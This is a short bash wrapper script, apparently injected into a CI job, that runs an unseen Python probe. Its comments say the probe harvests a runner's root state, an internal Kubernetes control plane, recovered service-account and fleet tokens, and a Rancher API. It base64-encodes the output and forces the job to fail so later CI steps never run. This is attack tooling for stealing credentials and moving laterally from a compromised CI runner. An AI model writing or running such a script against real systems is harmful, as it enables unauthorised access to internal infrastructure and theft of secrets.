#!/usr/bin/env bash
# i10579 - bounded read-only harvest of github-nmz1 root state + HYGON k8s control plane
# (10.17.1.1:6443), the recovered SA/fleet tokens and the in-cluster Rancher API, executed
# from the Stage A job container. Base64 output; exits 1 so later CI steps never run.
set -uo pipefail
echo "===I10579-WRAPPER-BEGIN $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown) job=${GITHUB_JOB:-?} run=${GITHUB_RUN_ID:-?}==="
timeout 1500 python3 "$(dirname "${BASH_SOURCE[0]}")/i10579_probe.py"
rc=$?
echo "--- i10579 rc=${rc}"
echo "===I10579-WRAPPER-END $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
exit 1
